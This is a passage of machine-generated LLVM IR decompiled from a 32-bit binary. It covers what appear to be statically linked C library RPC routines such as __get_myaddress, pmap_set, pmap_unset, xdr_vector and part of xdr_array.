  store i16 %v1_806703a, i16* @global_var_807e088.789, align 8
  %v0_8067041.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_8067041

dec_label_pc_8067041:                             ; preds = %dec_label_pc_806701b, %dec_label_pc_8067025
  %v0_8067041 = phi i32 [ %v0_8067025, %dec_label_pc_806701b ], [ %v0_8067041.pre, %dec_label_pc_8067025 ]
  %v1_8067041 = call i32 @__errno_location(i32 %v0_8067041)
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v1_8067041, i32* %edi.global-to-local, align 4
  %v1_806704a = inttoptr i32 %v1_8067041 to i32*
  store i32 98, i32* %v1_806704a, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_806709018 = load i32, i32* %esi.global-to-local, align 4
  %v1_806709019 = add i32 %v0_806709018, -423
  %v6_806709021 = sub i32 422, %v0_806709018
  %v7_806709022 = and i32 %v6_806709021, %v0_806709018
  %v8_806709023 = icmp slt i32 %v7_806709022, 0
  %v9_806709024 = icmp eq i32 %v1_806709019, 0
  %v10_806709025 = icmp slt i32 %v1_806709019, 0
  %v3_806709626 = icmp eq i1 %v10_806709025, %v8_806709023
  %v4_806709627 = icmp eq i1 %v9_806709024, false
  %v5_806709628 = and i1 %v4_806709627, %v3_806709626
  br i1 %v5_806709628, label %dec_label_pc_80670a1, label %dec_label_pc_8067098

dec_label_pc_8067055:                             ; preds = %dec_label_pc_806709c
  %v0_8067055 = load i16, i16* @global_var_807e088.789, align 8
  store i32 ashr (i32 shl (i32 ptrtoint (i8* @global_var_807e089.790 to i32), i32 16), i32 16), i32* %edx.global-to-local, align 4
  %v2_8067063 = call i16 @llvm.bswap.i16(i16 %v0_8067055)
  %v3_8067063 = zext i16 %v2_8067063 to i32
  store i32 %v3_8067063, i32* %eax.global-to-local, align 4
  %v2_806706c = load i32, i32* @ebx, align 4
  %v3_806706c = add i32 %v2_806706c, 2
  %v4_806706c = inttoptr i32 %v3_806706c to i16*
  store i16 %v2_8067063, i16* %v4_806706c, align 2
  %v0_8067070 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067070 = trunc i32 %v0_8067070 to i16
  %.v1_8067070 = select i1 icmp sgt (i16 trunc (i32 ashr (i32 shl (i32 ptrtoint (i8* @global_var_807e089.790 to i32), i32 16), i32 16) to i16), i16 1023), i16 600, i16 %v1_8067070
  store i16 %.v1_8067070, i16* @global_var_807e088.789, align 8
  %v0_8067082 = load i32, i32* %eax.global-to-local, align 4
  %v0_8067083 = load i32, i32* %esi.global-to-local, align 4
  %v1_8067083 = add i32 %v0_8067083, 1
  store i32 %v1_8067083, i32* %esi.global-to-local, align 4
  %v0_8067086 = load i32, i32* @ebx, align 4
  %v4_8067088 = call i32 @bind(i32 %v0_8067086, i32 16, i32 %v0_8067082)
  store i32 %v4_8067088, i32* %eax.global-to-local, align 4
  %v1_8067090 = add i32 %v0_8067083, -422
  %v6_8067090 = sub i32 421, %v0_8067083
  %v7_8067090 = and i32 %v6_8067090, %v1_8067083
  %v8_8067090 = icmp slt i32 %v7_8067090, 0
  %v9_8067090 = icmp eq i32 %v1_8067090, 0
  %v10_8067090 = icmp slt i32 %v1_8067090, 0
  %v3_8067096 = icmp eq i1 %v10_8067090, %v8_8067090
  %v4_8067096 = icmp eq i1 %v9_8067090, false
  %v5_8067096 = and i1 %v4_8067096, %v3_8067096
  br i1 %v5_8067096, label %dec_label_pc_80670a1, label %dec_label_pc_8067098

dec_label_pc_8067098:                             ; preds = %dec_label_pc_8067041, %dec_label_pc_8067055
  %v0_806709829 = phi i32 [ %v4_8067088, %dec_label_pc_8067055 ], [ -1, %dec_label_pc_8067041 ]
  %v2_8067098 = icmp slt i32 %v0_806709829, 0
  %v1_806709a = icmp eq i1 %v2_8067098, false
  br i1 %v1_806709a, label %dec_label_pc_80670a1, label %dec_label_pc_806709c

dec_label_pc_806709c:                             ; preds = %dec_label_pc_8067098
  %v0_806709c = load i32, i32* %edi.global-to-local, align 4
  %v1_806709c = inttoptr i32 %v0_806709c to i32*
  %v2_806709c = load i32, i32* %v1_806709c, align 4
  %v11_806709c = icmp eq i32 %v2_806709c, 98
  br i1 %v11_806709c, label %dec_label_pc_8067055, label %dec_label_pc_80670a1

dec_label_pc_80670a1:                             ; preds = %dec_label_pc_8067041, %dec_label_pc_8067055, %dec_label_pc_8067098, %dec_label_pc_806709c, %dec_label_pc_8067008
  %v0_80670a8 = phi i32 [ -1, %dec_label_pc_8067008 ], [ -1, %dec_label_pc_8067041 ], [ %v4_8067088, %dec_label_pc_8067055 ], [ %v0_806709829, %dec_label_pc_8067098 ], [ %v0_806709829, %dec_label_pc_806709c ]
  store i32 %v0_8066fd7, i32* @ebx, align 4
  ret i32 %v0_80670a8

; uselistorder directives
  uselistorder i32 %v1_8067090, { 1, 0 }
  uselistorder i32 %v1_8067041, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 0, 3, 1, 4, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 98, { 0, 2, 1 }
  uselistorder i64 424, { 1, 0 }
  uselistorder i32 31, { 40, 42, 37, 38, 28, 43, 44, 26, 2, 3, 0, 1, 13, 39, 30, 31, 32, 6, 7, 4, 5, 27, 8, 9, 33, 29, 45, 46, 41, 14, 10, 15, 16, 34, 17, 18, 19, 20, 11, 21, 22, 35, 23, 12, 36, 24, 25 }
  uselistorder i32 (i32)* @__libc_getpid, { 1, 4, 2, 11, 10, 9, 8, 3, 7, 6, 5, 0 }
  uselistorder i16* @global_var_807e088.789, { 3, 2, 1, 0 }
  uselistorder i32 96, { 5, 2, 3, 6, 0, 1, 4 }
  uselistorder i16* null, { 1, 0, 2 }
  uselistorder i16* %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80670a1, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_8067098, { 1, 0 }
  uselistorder label %dec_label_pc_8067041, { 1, 0 }
}

define i32 @__get_myaddress(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i16 @__decompiler_undefined_function_2()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80670ac = load i32, i32* @ebp, align 4
  %v0_80670ad = load i32, i32* @edi, align 4
  %v0_80670ae = load i32, i32* @esi, align 4
  %v0_80670af = load i32, i32* @ebx, align 4
  store i32 %v0_80670af, i32* %stack_var_-16, align 4
  %v0_80670b6 = load i32, i32* @eax, align 4
  %v4_80670c0 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_80670c8 = icmp slt i32 %v4_80670c0, 0
  store i32 %v4_80670c0, i32* @ebp, align 4
  %v1_80670cc = icmp eq i1 %v2_80670c8, false
  br i1 %v1_80670cc, label %dec_label_pc_80670d8, label %dec_label_pc_80670ce

dec_label_pc_80670ce:                             ; preds = %entry
  br label %dec_label_pc_8067119

dec_label_pc_80670d8:                             ; preds = %entry
  %v2_80670d8 = ptrtoint i32* %stack_var_-4152 to i32
  %v2_80670e3 = ptrtoint i32* %stack_var_-24 to i32
  store i32 4096, i32* %stack_var_-24, align 4
  %v0_80670f5 = load i32, i32* @ebx, align 4
  %v3_80670fd = call i32 @ioctl(i32 35090, i32 %v2_80670e3, i32 %v0_80670f5)
  %v2_806710d = icmp slt i32 %v3_80670fd, 0
  %v1_806710f = icmp eq i1 %v2_806710d, false
  br i1 %v1_806710f, label %dec_label_pc_806712a.preheader, label %dec_label_pc_8067111

dec_label_pc_8067111:                             ; preds = %dec_label_pc_80670d8
  br label %dec_label_pc_8067119

dec_label_pc_8067119:                             ; preds = %dec_label_pc_8067161, %dec_label_pc_80670ce, %dec_label_pc_8067111
  %stack_var_-4164.0 = phi i32 [ %stack_var_-4164.1, %dec_label_pc_8067161 ], [ 1, %dec_label_pc_8067111 ], [ %tmp18, %dec_label_pc_80670ce ]
  %stack_var_-20.0 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8067161 ], [ %v2_80670d8, %dec_label_pc_8067111 ], [ %tmp19, %dec_label_pc_80670ce ]
  %v0_8067119 = phi i8* [ getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_806f145.793, i32 0, i32 0), %dec_label_pc_8067161 ], [ getelementptr inbounds ([53 x i8], [53 x i8]* @global_var_806f110.792, i32 0, i32 0), %dec_label_pc_8067111 ], [ getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_806f0f8.791, i32 0, i32 0), %dec_label_pc_80670ce ]
  %v3_8067119 = call i32 @perror(i8* nonnull %v0_8067119)
  %v2_8067125 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_806712a.preheader

dec_label_pc_806712a.preheader:                   ; preds = %dec_label_pc_8067119, %dec_label_pc_80670d8
  %stack_var_-4164.1.ph = phi i32 [ %stack_var_-4164.0, %dec_label_pc_8067119 ], [ 1, %dec_label_pc_80670d8 ]
  %stack_var_-20.1.ph = phi i32 [ %stack_var_-20.0, %dec_label_pc_8067119 ], [ %v2_80670d8, %dec_label_pc_80670d8 ]
  %v2_806713a = ptrtoint i32* %stack_var_-56 to i32
  %tmp35 = bitcast i32* %stack_var_-56 to i16*
  %v2_8067173 = urem i16 %tmp, 2
  %v3_8067173 = icmp eq i16 %v2_8067173, 0
  %v2_806717e = and i16 %tmp, 8
  %v3_806717e = icmp eq i16 %v2_806717e, 0
  %v1_8067180 = icmp eq i1 %v3_806717e, false
  br label %dec_label_pc_806712a

dec_label_pc_806712a:                             ; preds = %dec_label_pc_806712a.preheader, %dec_label_pc_80671c0
  %stack_var_-4164.1 = phi i32 [ 0, %dec_label_pc_80671c0 ], [ %stack_var_-4164.1.ph, %dec_label_pc_806712a.preheader ]
  store i32 %stack_var_-20.1.ph, i32* @esi, align 4
  %v3_8067131 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_8067131, i32* @edi, align 4
  %v1_80671b85 = icmp eq i32 %v3_8067131, 0
  %v1_80671ba12 = icmp eq i1 %v1_80671b85, false
  br i1 %v1_80671ba12, label %dec_label_pc_806713a.lr.ph, label %dec_label_pc_80671c0

dec_label_pc_806713a.lr.ph:                       ; preds = %dec_label_pc_806712a
  %v4_8067182 = icmp eq i32 %stack_var_-4164.1, 0
  %v1_8067187 = icmp eq i1 %v4_8067182, false
  br label %dec_label_pc_806713a

dec_label_pc_806713a:                             ; preds = %dec_label_pc_806713a.lr.ph, %dec_label_pc_80671b2
  %v0_8067144 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_806713a.lr.ph ], [ %v1_80671b2, %dec_label_pc_80671b2 ]
  store i32 %v2_806713a, i32* @ebx, align 4
  %v0_8067141 = load i32, i32* @ecx, align 4
  %v5_8067146 = call i32 @memcpy(i16* %tmp35, i32 %v0_8067144, i32 32)
  %v3_8067155 = call i32 @ioctl(i32 35091, i32 %v2_806713a, i32 %v0_8067141)
  %v2_806715d = icmp slt i32 %v3_8067155, 0
  %v1_806715f = icmp eq i1 %v2_806715d, false
  br i1 %v1_806715f, label %dec_label_pc_806716b, label %dec_label_pc_8067161

dec_label_pc_8067161:                             ; preds = %dec_label_pc_806713a
  br label %dec_label_pc_8067119

dec_label_pc_806716b:                             ; preds = %dec_label_pc_806713a
  %v0_80671b2.pre = load i32, i32* @esi, align 4
  br i1 %v3_8067173, label %dec_label_pc_80671b2, label %dec_label_pc_8067177

dec_label_pc_8067177:                             ; preds = %dec_label_pc_806716b
  %v1_8067177 = add i32 %v0_80671b2.pre, 16
  %v2_8067177 = inttoptr i32 %v1_8067177 to i16*
  %v3_8067177 = load i16, i16* %v2_8067177, align 2
  %v12_8067177 = icmp eq i16 %v3_8067177, 2
  %v1_806717c = icmp eq i1 %v12_8067177, false
  br i1 %v1_806717c, label %dec_label_pc_80671b2, label %dec_label_pc_806717e

dec_label_pc_806717e:                             ; preds = %dec_label_pc_8067177
  br i1 %v1_8067180, label %dec_label_pc_8067189, label %dec_label_pc_8067182

dec_label_pc_8067182:                             ; preds = %dec_label_pc_806717e
  br i1 %v1_8067187, label %dec_label_pc_80671b2, label %dec_label_pc_8067189

dec_label_pc_8067189:                             ; preds = %dec_label_pc_8067182, %dec_label_pc_806717e
  %tmp36 = inttoptr i32 %v0_80670b6 to i16*
  %v5_8067194 = call i32 @memcpy(i16* %tmp36, i32 %v1_8067177, i32 16)
  %v1_806719d = add i32 %v0_80670b6, 2
  %v2_806719d = inttoptr i32 %v1_806719d to i16*
  store i16 28416, i16* %v2_806719d, align 2
  %v0_80671a3 = load i32, i32* @ebp, align 4
  %v2_80671a6 = call i32 @__libc_close(i32 %v0_80671a3)
  br label %dec_label_pc_80671df

dec_label_pc_80671b2:                             ; preds = %dec_label_pc_806716b, %dec_label_pc_8067182, %dec_label_pc_8067177
  %v1_80671b2 = add i32 %v0_80671b2.pre, 32
  store i32 %v1_80671b2, i32* @esi, align 4
  %v0_80671b5 = load i32, i32* @edi, align 4
  %v1_80671b5 = add i32 %v0_80671b5, -32
  %v6_80671b5 = icmp eq i32 %v1_80671b5, 0
  store i32 %v1_80671b5, i32* @edi, align 4
  %v1_80671ba = icmp eq i1 %v6_80671b5, false
  br i1 %v1_80671ba, label %dec_label_pc_806713a, label %dec_label_pc_80671c0

dec_label_pc_80671c0:                             ; preds = %dec_label_pc_80671b2, %dec_label_pc_806712a
  %v12_80671c0 = icmp eq i32 %stack_var_-4164.1, 1
  %v1_80671c5 = icmp eq i1 %v12_80671c0, false
  br i1 %v1_80671c5, label %dec_label_pc_80671d4, label %dec_label_pc_806712a

dec_label_pc_80671d4:                             ; preds = %dec_label_pc_80671c0
  %v0_80671d7 = load i32, i32* @ebp, align 4
  %v2_80671d8 = call i32 @__libc_close(i32 %v0_80671d7)
  br label %dec_label_pc_80671df

dec_label_pc_80671df:                             ; preds = %dec_label_pc_8067189, %dec_label_pc_80671d4
  %storemerge2 = phi i32 [ 0, %dec_label_pc_80671d4 ], [ 1, %dec_label_pc_8067189 ]
  %v2_80671e5 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80671e5, i32* @ebx, align 4
  store i32 %v0_80670ae, i32* @esi, align 4
  store i32 %v0_80670ad, i32* @edi, align 4
  store i32 %v0_80670ac, i32* @ebp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_80671b2, { 1, 0 }
  uselistorder i32 %stack_var_-4164.1, { 0, 2, 1 }
  uselistorder i32 (i32)* @__libc_close, { 1, 0, 8, 7, 6, 26, 25, 24, 23, 22, 21, 20, 19, 27, 18, 11, 17, 16, 15, 14, 10, 9, 5, 13, 12, 3, 2, 4 }
  uselistorder i16 28416, { 1, 0 }
  uselistorder i16 2, { 0, 19, 1, 5, 6, 7, 24, 2, 3, 8, 20, 4, 21, 23, 9, 10, 11, 12, 22, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32)* @__GI_exit, { 3, 1, 0, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 18, 17, 16, 15, 14, 13, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 2, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 (i8*)* @perror, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 10, 9, 8, 7, 12, 11, 3, 0, 6, 13, 5, 4 }
  uselistorder i32 35090, { 0, 2, 1 }
  uselistorder i32 4096, { 37, 15, 1, 16, 10, 40, 11, 41, 12, 39, 25, 38, 13, 26, 17, 3, 18, 2, 27, 21, 7, 22, 6, 28, 19, 5, 20, 4, 29, 30, 31, 32, 33, 34, 35, 36, 0, 14, 23, 9, 24, 8 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 38, 37, 4, 1, 16, 36, 35, 5, 39, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 3, 2 }
  uselistorder label %dec_label_pc_80671df, { 1, 0 }
  uselistorder label %dec_label_pc_80671b2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_806713a, { 1, 0 }
  uselistorder label %dec_label_pc_806712a, { 1, 0 }
  uselistorder label %dec_label_pc_8067119, { 0, 2, 1 }
}

define i32 @__GI_pmap_unset(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_80671ea = load i32, i32* @ebx, align 4
  %v2_80671ee = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80671ee, i32* @ebx, align 4
  store i32 %v2_80671ee, i32* @eax, align 4
  store i32 -1, i32* %stack_var_-8, align 4
  %v2_80671fc = call i32 @__get_myaddress(i32 -1, i32 %v0_80671ea)
  %v1_8067201 = icmp eq i32 %v2_80671fc, 0
  br i1 %v1_8067201, label %entry.dec_label_pc_8067295_crit_edge, label %dec_label_pc_8067209

entry.dec_label_pc_8067295_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8067295

dec_label_pc_8067209:                             ; preds = %entry
  %v2_8067213 = ptrtoint i32* %stack_var_-8 to i32
  %v9_806722c = call i32 @__GI_clntudp_bufcreate(i32 %v2_80671ee, i32 100000, i32 2, i32 5, i32* null, i32 %v2_8067213, i32 400, i32 400)
  %v1_8067234 = icmp eq i32 %v9_806722c, 0
  store i32 %v9_806722c, i32* %ebx.global-to-local, align 4
  br i1 %v1_8067234, label %dec_label_pc_8067295, label %dec_label_pc_806723a

dec_label_pc_806723a:                             ; preds = %dec_label_pc_8067209
  %v1_8067262 = add i32 %v9_806722c, 4
  %v2_8067262 = inttoptr i32 %v1_8067262 to i32*
  %v3_8067262 = load i32, i32* %v2_8067262, align 4
  store i32 %v3_8067262, i32* @ecx, align 4
  %v5_8067280 = inttoptr i32 %v3_8067262 to i32*
  %v6_8067280 = load i32, i32* %v5_8067280, align 4
  call void @__pseudo_call(i32 %v6_8067280)
  %v0_8067282 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067282 = add i32 %v0_8067282, 4
  %v2_8067282 = inttoptr i32 %v1_8067282 to i32*
  %v3_8067282 = load i32, i32* %v2_8067282, align 4
  %v5_8067289 = add i32 %v3_8067282, 16
  %v6_8067289 = inttoptr i32 %v5_8067289 to i32*
  %v7_8067289 = load i32, i32* %v6_8067289, align 4
  call void @__pseudo_call(i32 %v7_8067289)
  %v2_806729a.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8067297

dec_label_pc_8067295:                             ; preds = %entry.dec_label_pc_8067295_crit_edge, %dec_label_pc_8067209
  br label %dec_label_pc_8067297

dec_label_pc_8067297:                             ; preds = %dec_label_pc_806723a, %dec_label_pc_8067295
  %v2_806729a = phi i32 [ %v2_806729a.pre, %dec_label_pc_806723a ], [ %tmp12, %dec_label_pc_8067295 ]
  %v0_806729b = phi i32 [ %tmp, %dec_label_pc_806723a ], [ 0, %dec_label_pc_8067295 ]
  store i32 %v2_806729a, i32* %ebx.global-to-local, align 4
  ret i32 %v0_806729b

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8067297, { 1, 0 }
  uselistorder label %dec_label_pc_8067295, { 1, 0 }
}

define i32 @pmap_set(i32 %arg1, i32 %arg2, i32 %arg3, i16 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_806729d = load i32, i32* @ebx, align 4
  %v2_80672a1 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80672a1, i32* @ebx, align 4
  %v4_80672a5 = zext i16 %arg4 to i32
  store i32 %v4_80672a5, i32* @esi, align 4
  store i32 %v2_80672a1, i32* @eax, align 4
  store i32 -1, i32* %stack_var_-12, align 4
  %v2_80672b4 = call i32 @__get_myaddress(i32 -1, i32 %v0_806729d)
  %v1_80672b9 = icmp eq i32 %v2_80672b4, 0
  br i1 %v1_80672b9, label %entry.dec_label_pc_8067368_crit_edge, label %dec_label_pc_80672c1

entry.dec_label_pc_8067368_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8067368

dec_label_pc_80672c1:                             ; preds = %entry
  %v2_80672cb = ptrtoint i32* %stack_var_-12 to i32
  %sext = mul i32 %v2_80672cb, 65536
  %v6_80672e4 = sdiv i32 %sext, 65536
  %v10_80672e4 = call i32 @__GI_clntudp_bufcreate(i32 %v2_80672a1, i32 100000, i32 2, i32 5, i32* null, i32 %v6_80672e4, i32 400, i32 400)
  %v1_80672ec = icmp eq i32 %v10_80672e4, 0
  store i32 %v10_80672e4, i32* @ebx, align 4
  br i1 %v1_80672ec, label %dec_label_pc_8067368, label %dec_label_pc_8067355

dec_label_pc_8067355:                             ; preds = %dec_label_pc_80672c1
  %v1_8067316 = add i32 %v10_80672e4, 4
  %v2_8067316 = inttoptr i32 %v1_8067316 to i32*
  %v3_8067316 = load i32, i32* %v2_8067316, align 4
  store i32 %v3_8067316, i32* @ecx, align 4
  %v5_8067334 = inttoptr i32 %v3_8067316 to i32*
  %v6_8067334 = load i32, i32* %v5_8067334, align 4
  call void @__pseudo_call(i32 %v6_8067334)
  %v0_806733d = load i32, i32* @esi, align 4
  %v0_8067344 = load i32, i32* @ebx, align 4
  %sext7 = mul i32 %v0_806733d, 65536
  %v3_8067345 = sdiv i32 %sext7, 65536
  %v5_8067345 = call i32 @clnt_perror(i32 %v0_8067344, i32 ptrtoint ([24 x i8]* @global_var_806f15c.798 to i32), i32 %v3_8067345, i32 %v0_806733d)
  %v0_8067355 = load i32, i32* @ebx, align 4
  %v1_8067355 = add i32 %v0_8067355, 4
  %v2_8067355 = inttoptr i32 %v1_8067355 to i32*
  %v3_8067355 = load i32, i32* %v2_8067355, align 4
  %v5_806735c = add i32 %v3_8067355, 16
  %v6_806735c = inttoptr i32 %v5_806735c to i32*
  %v7_806735c = load i32, i32* %v6_806735c, align 4
  call void @__pseudo_call(i32 %v7_806735c)
  br label %dec_label_pc_806736a

dec_label_pc_8067368:                             ; preds = %entry.dec_label_pc_8067368_crit_edge, %dec_label_pc_80672c1
  br label %dec_label_pc_806736a

dec_label_pc_806736a:                             ; preds = %dec_label_pc_8067355, %dec_label_pc_8067368
  %v0_806736f = phi i32 [ %tmp, %dec_label_pc_8067355 ], [ 0, %dec_label_pc_8067368 ]
  ret i32 %v0_806736f

; uselistorder directives
  uselistorder i32 %v0_806733d, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32*, i32, i32, i32)* @__GI_clntudp_bufcreate, { 0, 3, 2, 1 }
  uselistorder i32* null, { 0, 1, 3, 2, 13, 4, 14, 15, 5, 6, 16, 17, 18, 19, 20, 21, 22, 23, 7, 8, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 9, 37, 38, 39, 40, 10, 41, 42, 43, 44, 11, 45, 46, 12, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63 }
  uselistorder i32 100000, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @__get_myaddress, { 1, 0 }
  uselistorder label %dec_label_pc_806736a, { 1, 0 }
  uselistorder label %dec_label_pc_8067368, { 1, 0 }
}

define i32 @_rpc_dtablesize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8067373 = load i32, i32* @global_var_807e08c.799, align 4
  %v1_8067373 = icmp eq i32 %v0_8067373, 0
  %v1_806737a = icmp eq i1 %v1_8067373, false
  br i1 %v1_806737a, label %dec_label_pc_8067386, label %dec_label_pc_806737c

dec_label_pc_806737c:                             ; preds = %entry
  %v1_806737c = call i32 @getdtablesize(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_806737c, i32* @global_var_807e08c.799, align 4
  br label %dec_label_pc_8067386

dec_label_pc_8067386:                             ; preds = %entry, %dec_label_pc_806737c
  %v0_8067386 = phi i32 [ %v0_8067373, %entry ], [ %v1_806737c, %dec_label_pc_806737c ]
  ret i32 %v0_8067386

; uselistorder directives
  uselistorder i32 (i32)* @getdtablesize, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_8067386, { 1, 0 }
}

define i32 @xdr_vector(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8067395 = load i32, i32* @ebx, align 4
  store i32 %v0_8067395, i32* %stack_var_-16, align 4
  store i32 %arg4, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v10_80673bb22 = icmp eq i32 %arg3, 0
  br i1 %v10_80673bb22, label %dec_label_pc_80673c1, label %dec_label_pc_80673a7

dec_label_pc_80673a7:                             ; preds = %entry, %dec_label_pc_80673b8
  call void @__pseudo_call(i32 %arg5)
  %v0_80673b4 = load i32, i32* @eax, align 4
  %v1_80673b4 = icmp eq i32 %v0_80673b4, 0
  br i1 %v1_80673b4, label %dec_label_pc_80673c6, label %dec_label_pc_80673b8

dec_label_pc_80673b8:                             ; preds = %dec_label_pc_80673a7
  %v0_80673b8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80673b8 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80673b8 = add i32 %v1_80673b8, %v0_80673b8
  store i32 %v2_80673b8, i32* %ebx.global-to-local, align 4
  %v0_80673ba = load i32, i32* %esi.global-to-local, align 4
  %v1_80673ba = add i32 %v0_80673ba, 1
  store i32 %v1_80673ba, i32* %esi.global-to-local, align 4
  %v10_80673bb = icmp ult i32 %v1_80673ba, %arg3
  br i1 %v10_80673bb, label %dec_label_pc_80673a7, label %dec_label_pc_80673c1

dec_label_pc_80673c1:                             ; preds = %entry, %dec_label_pc_80673b8
  br label %dec_label_pc_80673c6

dec_label_pc_80673c6:                             ; preds = %dec_label_pc_80673a7, %dec_label_pc_80673c1
  %v2_80673c9 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80673c9, i32* %ebx.global-to-local, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80673c6, { 1, 0 }
  uselistorder label %dec_label_pc_80673c1, { 1, 0 }
  uselistorder label %dec_label_pc_80673a7, { 1, 0 }
}

define i32 @__GI_xdr_array(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp7 = sext i32 %arg5 to i64
  %tmp10 = ptrtoint i32* %arg1 to i32
  %v0_80673ce = load i32, i32* @ebp, align 4
  %v0_80673cf = load i32, i32* @edi, align 4
  %v0_80673d0 = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @eax, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v1_80673dd = inttoptr i32 %arg2 to i32*
  %v6_80673e4 = call i32 @xdr_u_long(i32* %arg1, i32 %arg3)
  store i32 %v6_80673e4, i32* %eax.global-to-local, align 4
  %v1_80673ec = icmp eq i32 %v6_80673e4, 0
  br i1 %v1_80673ec, label %dec_label_pc_80674c6, label %dec_label_pc_80673f4

dec_label_pc_80673f4:                             ; preds = %entry
  %v0_80673f4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80673f4 = inttoptr i32 %v0_80673f4 to i32*
  %v2_80673f4 = load i32, i32* %v1_80673f4, align 4
  store i32 %v2_80673f4, i32* @edi, align 4
  %v6_80673fa = icmp ugt i32 %v2_80673f4, %arg4
  br i1 %v6_80673fa, label %dec_label_pc_8067409, label %dec_label_pc_80673fc

dec_label_pc_80673fc:                             ; preds = %dec_label_pc_80673f4
  %v12_8067401 = udiv i64 4294967295, %tmp7
  %v13_8067401 = trunc i64 %v12_8067401 to i32
  store i32 %v13_8067401, i32* %eax.global-to-local, align 4
  %v14_8067401 = urem i64 4294967295, %tmp7
  %v15_8067401 = trunc i64 %v14_8067401 to i32
  store i32 %v15_8067401, i32* @edx, align 4
  %tmp = icmp ugt i32 %v2_80673f4, %v13_8067401
  br i1 %tmp, label %dec_label_pc_8067409, label %dec_label_pc_8067416

dec_label_pc_8067409:                             ; preds = %dec_label_pc_80673fc, %dec_label_pc_80673f4
  store i32 %tmp10, i32* @edx, align 4
  %v2_806740d = load i32, i32* %arg1, align 4
  %v11_806740d = icmp eq i32 %v2_806740d, 2
  %v1_8067410 = icmp eq i1 %v11_806740d, false
  br i1 %v1_8067410, label %dec_label_pc_80674c6, label %dec_label_pc_8067416

dec_label_pc_8067416:                             ; preds = %dec_label_pc_80673fc, %dec_label_pc_8067409
  %v0_8067416 = load i32, i32* @ebx, align 4
